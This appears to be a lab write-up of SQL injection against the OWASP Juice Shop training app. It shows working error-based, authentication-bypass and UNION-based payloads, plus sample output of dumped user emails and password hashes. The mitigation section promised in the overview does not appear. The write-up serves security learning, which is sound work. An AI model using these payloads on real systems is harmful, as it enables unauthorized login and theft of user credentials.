# SQL Injection Attacks and Mitigation Techniques

### Overview
A hands-on demonstration of identifying SQL injection vulnerabilities, executing payloads for authentication bypass, error-based and union-based SQL injection, and implementing mitigation techniques like parameterized queries to secure vulnerable endpoints.

---

### Exploitation and Findings
Three categories of vulnerabilities were identified by looking at search boxes and login pages which are the injection points.
### 1. Injected Request (Error-based SQL injection)
Normal search request returning HTTP 200 OK response in a web application.
[![Project Dashboard](assets/screenshot1.png)](assets/dashboard-screenshot.png)

Adding a single quote (') breaks out of the backend SQL string context and produces a 500 Internal Server Error.
```SQL
GET /rest/products/search?q=apple' HTTP/1.1
```
### Root Cause:
The backend executes unhandled dynamic queries directly to the HTTP response, confirming that input sanitization is absent and the application is vulnerable to SQL injection.

### 2. Authentication Bypass
* Endpoint Tested: /api/Users/login
* Target Vector: Login Form Email field

### Normal Authentication Attempt
Entering random credentials results in an authentication error:
[![Project Dashboard](assets/screenshot2.png)](assets/dashboard-screenshot.png)

### Payload Injection
By injecting ' OR 1=1-- into the Email field, the backend query condition is manipulated to evaluate as TRUE no matter what the credentials are.
```SQL
username@test.com' OR 1=1--
```
[![Project Dashboard](assets/screenshot3.png)](assets/dashboard-screenshot.png)

### Backend Query Analysis
* Original Vulnerable Query:
  ```SQL
  SELECT * FROM users WHERE username='username@test.com' AND password='password';
  ```
* Injected Execution Query:
  ```SQL
  SELECT * FROM users WHERE username='' OR '1'='1' -- AND password='password';
  ```

### Outcome
Because '1'='1' is always true, the WHERE clause validates, bypassing the password check entirely. The application issues a valid JWT token for the first user in the database (admin@juice-sh.op), logging the attacker in as Administrator.

[![Project Dashboard](assets/screenshot4.png)](assets/dashboard-screenshot.png)

### 3. Union-Based SQL Injection
Union-based SQL Injection adds secondary queries via the UNION operator to retrieve dataset records from other database tables.

### Stage 1: Column Count Enumeration
To perform a UNION attack, the injected query must match the exact column count of the original query. Placeholders are injected iteratively into the search parameter until error status resolves:
```SQL
GET /rest/products/search?q=apple')) UNION SELECT 1,2,3 FROM Users-- HTTP/1.1
```
[![Project Dashboard](assets/screenshot5.png)](assets/dashboard-screenshot.png)

### Stage 2: Aligning Structure & Constructing Payload
Trial-and-error confirms the base query returns 9 columns. The injection is structured with 9 field placeholders matching the target table layout.
Payload Request:
```SQL
GET /rest/products/search?q=apple')) UNION SELECT id, email, password, 4, 5, 6, 7, 8, 9 FROM Users-- HTTP/1.1
```

[![Project Dashboard](assets/screenshot6.png)](assets/dashboard-screenshot.png)

### Stage 3: Sensitive Data Exfiltration
Executing the payload appends all user records (IDs, email addresses, and password hashes) directly into the JSON response body:
```SQL
{
  "id": 1,
  "name": "admin@juice-sh.op",
  "description": "0192023a7bbd73250516f069df18b500",
  "price": 4,
  "deluxePrice": 5,
  "image": 6,
  "createdAt": 7,
  "updatedAt": 8,
  "deletedAt": 9
},
{
  "id": 2,
  "name": "jim@juice-sh.op",
  "description": "e541ca7ecf72b8d1286474fc6135645",
  "price": 4,
  "deluxePrice": 5,
  "image": 6,
  "createdAt": 7,
  "updatedAt": 8,
  "deletedAt": 9
}
```

[![Project Dashboard](assets/screenshot7.png)](assets/dashboard-screenshot.png)

